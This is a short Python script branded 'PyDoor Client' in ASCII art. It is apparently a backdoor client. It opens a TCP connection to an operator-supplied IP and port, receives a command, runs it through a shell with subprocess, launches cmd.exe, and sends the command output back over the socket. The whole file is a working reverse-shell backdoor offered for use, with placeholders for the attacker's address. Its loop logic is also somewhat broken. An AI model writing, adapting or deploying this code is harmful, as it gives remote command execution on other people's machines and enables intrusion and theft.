import socket
import subprocess

ip = "xxx.xxx.xxx.xxx" #put the ip
port = xxxxx #put the port


print("Client Started...")
print("""

██████╗░██╗░░░██╗██████╗░░█████╗░░█████╗░██████╗░
██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██████╔╝░╚████╔╝░██║░░██║██║░░██║██║░░██║██████╔╝
██╔═══╝░░░╚██╔╝░░██║░░██║██║░░██║██║░░██║██╔══██╗
██║░░░░░░░░██║░░░██████╔╝╚█████╔╝╚█████╔╝██║░░██║
╚═╝░░░░░░░░╚═╝░░░╚═════╝░░╚════╝░░╚════╝░╚═╝░░╚═╝

    ▒█▀▀█ ▒█░░░ ▀█▀ ▒█▀▀▀ ▒█▄░▒█ ▀▀█▀▀ 
    ▒█░░░ ▒█░░░ ▒█░ ▒█▀▀▀ ▒█▒█▒█ ░▒█░░ 
    ▒█▄▄█ ▒█▄▄█ ▄█▄ ▒█▄▄▄ ▒█░░▀█ ░▒█░░
""")

address = (ip, port)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((address))

msg = sock.recv(1024)

print(msg.decode())


command = sock.recv(1024)
command = command.decode()
op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
subprocess.Popen("cmd.exe") #put the program that you want to run
while True:
    output = op.stdout.read()
    output_error = op.stderr.read()
    sock.send(output + output_error)
